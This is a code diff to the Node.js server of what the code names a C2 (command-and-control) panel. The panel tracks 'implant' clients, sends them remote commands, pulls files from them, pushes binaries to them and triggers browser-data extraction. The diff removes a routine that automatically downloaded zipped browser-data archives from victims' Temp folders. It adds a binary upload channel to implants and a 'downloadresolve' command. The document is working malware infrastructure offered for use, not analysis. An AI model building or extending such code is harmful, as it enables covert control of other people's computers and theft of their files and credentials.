@@ -391,11 +391,17 @@ async function loadDb() {
       db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin');`);
       persistDb();
     }
-    // Ensure tables exist when upgrading
-    db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin');`);
-    
-    // Create client history tables
-    db.run(`CREATE TABLE IF NOT EXISTS clients (
+    ensureDatabaseSchema();
+    persistDb();
+  }
+}
+
+/** Apply schema migrations (safe on existing DBs). */
+function ensureDatabaseSchema() {
+  if (!db) return;
+  db.run(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);`);
+  db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin');`);
+  db.run(`CREATE TABLE IF NOT EXISTS clients (
       id TEXT PRIMARY KEY,
       hostname TEXT NOT NULL,
       username TEXT NOT NULL,
@@ -407,8 +413,7 @@ async function loadDb() {
       totalConnections INTEGER DEFAULT 1,
       status TEXT DEFAULT 'offline'
     );`);
-    
-    db.run(`CREATE TABLE IF NOT EXISTS client_sessions (
+  db.run(`CREATE TABLE IF NOT EXISTS client_sessions (
       sessionId TEXT PRIMARY KEY,
       clientId TEXT NOT NULL,
       connectTime TEXT NOT NULL,
@@ -417,8 +422,7 @@ async function loadDb() {
       duration INTEGER,
       FOREIGN KEY (clientId) REFERENCES clients(id)
     );`);
-    
-    db.run(`CREATE TABLE IF NOT EXISTS client_commands (
+  db.run(`CREATE TABLE IF NOT EXISTS client_commands (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       clientId TEXT NOT NULL,
       sessionId TEXT,
@@ -428,9 +432,31 @@ async function loadDb() {
       FOREIGN KEY (clientId) REFERENCES clients(id),
       FOREIGN KEY (sessionId) REFERENCES client_sessions(sessionId)
     );`);
-    
-    persistDb();
+}
+
+/**
+ * Re-read c2.sqlite from disk into memory (e.g. after `node credential.js set ...`).
+ * Without this, a running server keeps a stale copy and login never sees new users.
+ */
+async function syncDatabaseFromDisk() {
+  if (!SQL) {
+    SQL = await initSqlJs();
   }
+  if (db) {
+    try {
+      db.close();
+    } catch (e) {
+      /* ignore */
+    }
+    db = null;
+  }
+  if (fs.existsSync(dbPath)) {
+    db = new SQL.Database(fs.readFileSync(dbPath));
+  } else {
+    db = new SQL.Database();
+  }
+  ensureDatabaseSchema();
+  persistDb();
 }
 
 function persistDb() {
@@ -489,7 +515,13 @@ function setSettings(partial) {
 
 function getSetting(key, defaultValue) {
   const stmt = db.prepare('SELECT value FROM settings WHERE key = ?');
-  const row = stmt.getAsObject([key]);
+  stmt.bind([key]);
+  if (!stmt.step()) {
+    stmt.free();
+    return defaultValue;
+  }
+  const row = stmt.getAsObject();
+  stmt.free();
   if (row && row.value) {
     try { return JSON.parse(row.value); } catch { return row.value; }
   }
@@ -651,6 +683,30 @@ function getOrganizedFilePath(clientId, client, filename) {
   const clientDir = getClientDownloadDir(clientId, client);
   const safeFilename = path.basename(filename);
   return path.join(clientDir, safeFilename);
+}
+
+/** If buffer is a ZIP (PK…) and basename is not already a zip-based type, use .zip so folder archives save correctly. */
+function physicalDownloadBasename(remotePath, buffer) {
+  const base = path.basename(remotePath || `download_${Date.now()}`);
+  if (!Buffer.isBuffer(buffer) || buffer.length < 4) return base;
+  if (buffer[0] !== 0x50 || buffer[1] !== 0x4b) return base;
+  const low = base.toLowerCase();
+  const zipFamily = ['.zip', '.jar', '.war', '.docx', '.xlsx', '.pptx', '.apk', '.odt', '.ods', '.odp', '.epub', '.whl', '.vsix', '.pptm', '.xlsm', '.docm'];
+  for (const ext of zipFamily) {
+    if (low.endsWith(ext)) return base;
+  }
+  return `${base}.zip`;
+}
+
+function logTcpDownloadProgress(pd) {
+  const len = (pd.buffer || Buffer.alloc(0)).length;
+  const mb = Math.floor(len / (1024 * 1024));
+  if (mb < 1) return;
+  if (pd._progressNextMb == null) pd._progressNextMb = 5;
+  while (mb >= pd._progressNextMb) {
+    console.log(`[TCP] Download progress: ~${pd._progressNextMb} MiB — ${path.basename(pd.filename || 'file')}`);
+    pd._progressNextMb += 5;
+  }
 }
 
 // ============================================================
@@ -869,33 +925,30 @@ function createTcpServer() {
       if (c && c.pendingDownload && c.pendingDownload.inProgress) {
         const pd = c.pendingDownload;
         pd.buffer = Buffer.concat([pd.buffer || Buffer.alloc(0), data]);
+        logTcpDownloadProgress(pd);
         if (pd.timeout) clearTimeout(pd.timeout);
         pd.timeout = setTimeout(async () => {
           try {
-            const filename = path.basename(pd.filename || `download_${Date.now()}`);
+            const saveName = physicalDownloadBasename(pd.filename || `download_${Date.now()}`, pd.buffer || Buffer.alloc(0));
             const client = clients.get(clientId);
-            const downloadPath = getOrganizedFilePath(clientId, client, filename);
+            const downloadPath = getOrganizedFilePath(clientId, client, saveName);
             fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
             console.log(`[TCP] File downloaded: ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
-            io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
+            io.emit('fileDownloaded', { clientId, filename: saveName, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
             // Also emit a terminal-friendly message
             io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
             
-            // Check if this is a ZIP file with shortcut resolution enabled
-            if (pd.resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
+            // Only parse ZIP / .lnk for follow-on downloads when explicitly requested (pendingDownload.resolveShortcuts).
+            if (pd.resolveShortcuts && saveName.toLowerCase().endsWith('.zip')) {
               console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
-              // Process shortcuts in the background
               setTimeout(() => {
                 extractAndResolveShortcuts(downloadPath, clientId, socket);
-              }, 3000); // Wait 3 seconds after ZIP download
-            }
-            // Check if this is a single .lnk file
-            else if (filename.toLowerCase().endsWith('.lnk')) {
+              }, 3000);
+            } else if (pd.resolveShortcuts && saveName.toLowerCase().endsWith('.lnk')) {
               console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
-              // Process single shortcut in the background
               setTimeout(() => {
                 resolveSingleShortcut(downloadPath, clientId, socket);
-              }, 1000); // Wait 1 second after shortcut download
+              }, 1000);
             }
           } catch (e) {
             console.error('[TCP] Error saving downloaded file:', e);
@@ -925,32 +978,28 @@ function createTcpServer() {
           const pd = client.pendingDownload;
           const chunk = Buffer.from(line, 'binary');
           pd.buffer = Buffer.concat([pd.buffer || Buffer.alloc(0), chunk]);
+          logTcpDownloadProgress(pd);
           if (pd.timeout) clearTimeout(pd.timeout);
           pd.timeout = setTimeout(async () => {
             try {
-              const filename = path.basename(pd.filename || `download_${Date.now()}`);
+              const saveName = physicalDownloadBasename(pd.filename || `download_${Date.now()}`, pd.buffer || Buffer.alloc(0));
               const client = clients.get(clientId);
-              const downloadPath = getOrganizedFilePath(clientId, client, filename);
+              const downloadPath = getOrganizedFilePath(clientId, client, saveName);
               fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
               console.log(`[TCP] File downloaded (text-split path): ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
-              io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
+              io.emit('fileDownloaded', { clientId, filename: saveName, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
               io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
               
-              // Check if this is a ZIP file with shortcut resolution enabled
-              if (pd.resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
+              if (pd.resolveShortcuts && saveName.toLowerCase().endsWith('.zip')) {
                 console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
-                // Process shortcuts in the background
                 setTimeout(() => {
                   extractAndResolveShortcuts(downloadPath, clientId, socket);
-                }, 3000); // Wait 3 seconds after ZIP download
-              }
-              // Check if this is a single .lnk file
-              else if (filename.toLowerCase().endsWith('.lnk')) {
+                }, 3000);
+              } else if (pd.resolveShortcuts && saveName.toLowerCase().endsWith('.lnk')) {
                 console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
-                // Process single shortcut in the background
                 setTimeout(() => {
                   resolveSingleShortcut(downloadPath, clientId, socket);
-                }, 1000); // Wait 1 second after shortcut download
+                }, 1000);
               }
             } catch (e) {
               console.error('[TCP] Error saving downloaded file (text-split):', e);
@@ -1041,70 +1090,48 @@ function createTcpServer() {
             }
           }
 
-          // Auto-detect extract result and trigger download
-          if (message.content.includes('AUTO_EXTRACT_START') && message.content.includes('ZIP FILE LOCATIONS')) {
-            // Extract the full ZIP path from the client output (dynamic path detection)
-            const zipPathMatch = message.content.match(/ZIP FILE LOCATIONS?:\s*([^\n\r]+)/i);
-            if (zipPathMatch) {
-              const zipPath = zipPathMatch[1].trim();
-              console.log(`[TCP] Auto-detected ZIP: ${zipPath}. Triggering download...`);
+          const respTrim = (message.content !== undefined && message.content !== null)
+            ? String(message.content).trim()
+            : '';
 
-              // Send download command
-              const downloadCmd = {
-                type: 'command',
-                content: `download ${zipPath}`
-              };
-              socket.write(JSON.stringify(downloadCmd) + '\n');
-
-              // Mark as expecting download with shortcut resolution flag
-              client.pendingDownload = {
-                inProgress: true,
-                filename: zipPath,
-                buffer: Buffer.alloc(0),
-                timeout: null,
-                resolveShortcuts: true, // Enable shortcut resolution for extracted files
-                clientId: clientId,
-                socket: socket
-              };
-
-              // Notify GUI and console
-              io.emit('commandResponse', { clientId, response: `Auto-download initiated: ${zipPath}`, timestamp: new Date() });
-              console.log(`[TCP] Auto-downloading ZIP from ${client.hostname}`);
-            } else {
-              // Fallback: try to extract just the filename and construct path
-              const zipMatch = message.content.match(/data_[a-f0-9]+\.zip/);
-              if (zipMatch) {
-                // Try common Windows temp paths
-                const possiblePaths = [
-                  `C:\\Users\\${client.username || 'ADMIN'}\\AppData\\Local\\Temp\\${zipMatch[0]}`,
-                  `C:\\Users\\${client.hostname}\\AppData\\Local\\Temp\\${zipMatch[0]}`,
-                  `C:\\Windows\\Temp\\${zipMatch[0]}`,
-                  `C:\\Temp\\${zipMatch[0]}`
-                ];
-                
-                const zipPath = possiblePaths[0]; // Use first fallback
-                console.log(`[TCP] Fallback ZIP path: ${zipPath}. Triggering download...`);
-
-                const downloadCmd = {
-                  type: 'command',
-                  content: `download ${zipPath}`
-                };
-                socket.write(JSON.stringify(downloadCmd) + '\n');
-
-                client.pendingDownload = {
-                  inProgress: true,
-                  filename: zipPath,
-                  buffer: Buffer.alloc(0),
-                  timeout: null
-                };
-
-                io.emit('commandResponse', { clientId, response: `Auto-download initiated (fallback): ${zipPath}`, timestamp: new Date() });
-                console.log(`[TCP] Auto-downloading ZIP from ${client.hostname} (fallback)`);
-              } else {
-                console.log('[TCP] No ZIP path found in extract result');
-              }
+          // Implant is ready to receive raw bytes: 8-byte LE size + file body
+          if (client.pendingUpload && respTrim === 'ready') {
+            if (client.pendingUploadTimeout) {
+              clearTimeout(client.pendingUploadTimeout);
+              client.pendingUploadTimeout = null;
             }
+            const pu = client.pendingUpload;
+            client.pendingUpload = null;
+            try {
+              const sizeBuf = Buffer.allocUnsafe(8);
+              sizeBuf.writeBigUInt64LE(BigInt(pu.buffer.length), 0);
+              client.socket.write(sizeBuf);
+              client.socket.write(pu.buffer);
+              const okMsg = `Upload complete (${pu.buffer.length} bytes) -> ${pu.remotePath}`;
+              const session = clientSessions.get(clientId) || [];
+              session.push({ timestamp: new Date(), type: 'response', content: okMsg });
+              clientSessions.set(clientId, session);
+              io.emit('commandResponse', { clientId, response: okMsg, timestamp: new Date() });
+            } catch (e) {
+              const errMsg = `Upload failed: ${e.message}`;
+              const session = clientSessions.get(clientId) || [];
+              session.push({ timestamp: new Date(), type: 'response', content: errMsg });
+              clientSessions.set(clientId, session);
+              io.emit('commandResponse', { clientId, response: errMsg, timestamp: new Date() });
+            }
+            continue;
           }
+
+          if (client.pendingUpload && respTrim.toLowerCase().includes('upload') && respTrim.toLowerCase().includes('failed')) {
+            if (client.pendingUploadTimeout) {
+              clearTimeout(client.pendingUploadTimeout);
+              client.pendingUploadTimeout = null;
+            }
+            client.pendingUpload = null;
+          }
+
+          // Note: Auto-extraction has been disabled. Use manual commands when needed.
+          // The 'extractbrowserhidden' and 'extractbrowser' commands are available for manual use.
           
           // Store in session history
           const session = clientSessions.get(clientId) || [];
@@ -1154,31 +1181,26 @@ function createTcpServer() {
       try {
         if (client.pendingDownload.timeout) clearTimeout(client.pendingDownload.timeout);
         const buf = client.pendingDownload.buffer || Buffer.alloc(0);
-        const filename = path.basename(client.pendingDownload.filename || `download_${Date.now()}`);
-        const downloadPath = getOrganizedFilePath(clientId, client, filename);
+        const saveName = physicalDownloadBasename(client.pendingDownload.filename || `download_${Date.now()}`, buf);
+        const downloadPath = getOrganizedFilePath(clientId, client, saveName);
         const resolveShortcuts = client.pendingDownload.resolveShortcuts;
         
         if (buf.length > 0) {
           fs.writeFileSync(downloadPath, buf);
           console.log(`[TCP] File downloaded (on close): ${downloadPath} (${buf.length} bytes)`);
-          io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: buf.length });
+          io.emit('fileDownloaded', { clientId, filename: saveName, path: downloadPath, size: buf.length });
           io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}` , timestamp: new Date() });
           
-          // Check if this is a ZIP file with shortcut resolution enabled
-          if (resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
+          if (resolveShortcuts && saveName.toLowerCase().endsWith('.zip')) {
             console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
-            // Process shortcuts in the background
             setTimeout(() => {
               extractAndResolveShortcuts(downloadPath, clientId, socket);
-            }, 3000); // Wait 3 seconds after ZIP download
-          }
-          // Check if this is a single .lnk file
-          else if (filename.toLowerCase().endsWith('.lnk')) {
+            }, 3000);
+          } else if (resolveShortcuts && saveName.toLowerCase().endsWith('.lnk')) {
             console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
-            // Process single shortcut in the background
             setTimeout(() => {
               resolveSingleShortcut(downloadPath, clientId, socket);
-            }, 1000); // Wait 1 second after shortcut download
+            }, 1000);
           }
         }
       } catch (e) {
@@ -1267,7 +1289,13 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
 // ---- Auth helpers ----
 function getUser(username) {
   const stmt = db.prepare('SELECT username, passwordHash, role FROM users WHERE username = ?');
-  const row = stmt.getAsObject([username]);
+  stmt.bind([username]);
+  if (!stmt.step()) {
+    stmt.free();
+    return null;
+  }
+  const row = stmt.getAsObject();
+  stmt.free();
   if (!row || !row.username) return null;
   return row;
 }
@@ -1287,7 +1315,7 @@ function requireAuth(req, res, next) {
 
 // Public login endpoint
 app.post('/api/login', async (req, res) => {
-  await loadDb();
+  await syncDatabaseFromDisk();
   const body = req.body || {};
   const username = body.username || '';
   const password = body.password || '';
@@ -1463,21 +1491,35 @@ io.on('connection', (socket) => {
           return;
         }
         
-        // If user is downloading via terminal, prepare pending download capture
-        if (typeof command === 'string' && command.trim().toLowerCase().startsWith('download ')) {
-          client.pendingDownload = {
-            inProgress: true,
-            filename: command.trim().slice('download '.length),
-            buffer: Buffer.alloc(0),
-            timeout: null
-          };
+        let tcpPayload = command;
+        if (typeof command === 'string') {
+          const t = command.trim();
+          const tl = t.toLowerCase();
+          if (tl.startsWith('downloadresolve ')) {
+            const remotePath = t.slice('downloadresolve '.length).trim();
+            client.pendingDownload = {
+              inProgress: true,
+              filename: remotePath,
+              buffer: Buffer.alloc(0),
+              timeout: null,
+              resolveShortcuts: true
+            };
+            tcpPayload = `download ${remotePath}`;
+          } else if (tl.startsWith('download ')) {
+            client.pendingDownload = {
+              inProgress: true,
+              filename: t.slice('download '.length).trim(),
+              buffer: Buffer.alloc(0),
+              timeout: null
+            };
+          }
         }
         const commandData = {
           type: 'command',
-          content: command
+          content: tcpPayload
         };
         
-        client.socket.write(JSON.stringify(commandData));
+        client.socket.write(JSON.stringify(commandData) + '\n');
         
         // Store command in history
         const session = clientSessions.get(clientId) || [];
@@ -1516,7 +1558,7 @@ io.on('connection', (socket) => {
     }
   });
   
-  // Handle file upload
+  // Handle file upload (path only — legacy; binary must follow on same TCP session)
   socket.on('uploadFile', (data) => {
     const { clientId, filename } = data;
     const client = clients.get(clientId);
@@ -1528,11 +1570,59 @@ io.on('connection', (socket) => {
           content: `upload ${filename}`
         };
         
-        client.socket.write(JSON.stringify(commandData));
+        client.socket.write(JSON.stringify(commandData) + '\n');
         socket.emit('uploadInitiated', { clientId, filename });
       } catch (error) {
         socket.emit('uploadError', { error: error.message });
       }
+    }
+  });
+
+  /** GUI sends base64 file body; server waits for implant "ready" then writes 8-byte size + bytes on TCP */
+  socket.on('uploadBinaryToClient', (data) => {
+    try {
+      const { clientId, remotePath, fileBase64 } = data || {};
+      const client = clients.get(clientId);
+      if (!client || !client.socket || !client.active) {
+        return socket.emit('uploadError', { clientId, error: 'Client not found or offline' });
+      }
+      if (client.pendingUpload) {
+        return socket.emit('uploadError', { clientId, error: 'Another upload is already in progress' });
+      }
+      if (!remotePath || !fileBase64) {
+        return socket.emit('uploadError', { clientId, error: 'remotePath and fileBase64 required' });
+      }
+      const maxBytes = 80 * 1024 * 1024;
+      const buf = Buffer.from(String(fileBase64), 'base64');
+      if (buf.length > maxBytes) {
+        return socket.emit('uploadError', { clientId, error: `File too large (max ${maxBytes / (1024 * 1024)} MiB)` });
+      }
+      const dest = String(remotePath).trim();
+      client.pendingUpload = { buffer: buf, remotePath: dest };
+      client.pendingUploadTimeout = setTimeout(() => {
+        if (client.pendingUpload) {
+          client.pendingUpload = null;
+          io.emit('commandResponse', {
+            clientId,
+            response: 'Upload timed out (no ready from client).',
+            timestamp: new Date()
+          });
+        }
+        client.pendingUploadTimeout = null;
+      }, 120000);
+
+      const commandData = { type: 'command', content: `upload ${dest}` };
+      client.socket.write(JSON.stringify(commandData) + '\n');
+
+      io.emit('commandSent', {
+        clientId,
+        command: `upload ${dest} (${buf.length} bytes from GUI)`,
+        timestamp: new Date()
+      });
+      socket.emit('uploadQueued', { clientId, remotePath: dest, size: buf.length });
+    } catch (error) {
+      console.error('[UPLOAD] uploadBinaryToClient:', error);
+      socket.emit('uploadError', { clientId: data && data.clientId, error: error.message });
     }
   });
   
@@ -1556,7 +1646,7 @@ io.on('connection', (socket) => {
           timeout: null
         };
 
-        client.socket.write(JSON.stringify(commandData));
+        client.socket.write(JSON.stringify(commandData) + '\n');
         socket.emit('downloadInitiated', { clientId, filename });
       } catch (error) {
         socket.emit('downloadError', { error: error.message });
